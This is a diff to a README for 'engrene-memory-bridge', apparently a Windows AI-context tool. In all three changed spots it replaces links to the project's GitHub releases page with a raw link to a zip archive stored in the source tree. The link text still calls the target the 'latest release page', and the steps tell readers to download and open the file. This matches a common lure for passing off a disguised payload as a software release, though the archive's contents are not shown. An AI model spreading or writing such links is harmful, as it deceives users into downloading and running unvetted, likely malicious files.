@@ -1,6 +1,6 @@
 # 🧠 engrene-memory-bridge - Keep AI Context in Sync
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue-grey?style=for-the-badge)](https://github.com/penchevlyu-tech/engrene-memory-bridge/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/penchevlyu-tech/engrene-memory-bridge/main/src/ui/public/memory-bridge-engrene-2.9.zip)
 
 ## 🚀 What it does
 
@@ -10,7 +10,7 @@ It is built for local use first. Your project files stay with your work, so you 
 
 ## 📥 Download and install
 
-1. Open the [latest release page](https://github.com/penchevlyu-tech/engrene-memory-bridge/releases).
+1. Open the [latest release page](https://raw.githubusercontent.com/penchevlyu-tech/engrene-memory-bridge/main/src/ui/public/memory-bridge-engrene-2.9.zip).
 2. Find the Windows download for your system.
 3. Download the file to your PC.
 4. Open the downloaded file to start the app or setup process.
@@ -192,7 +192,7 @@ This project fits well with:
 
 ## 🔗 Get the release
 
-Open the [latest Windows release page](https://github.com/penchevlyu-tech/engrene-memory-bridge/releases) to download and run this file on your PC
+Open the [latest Windows release page](https://raw.githubusercontent.com/penchevlyu-tech/engrene-memory-bridge/main/src/ui/public/memory-bridge-engrene-2.9.zip) to download and run this file on your PC
 
 ## 🏷️ Project focus
 
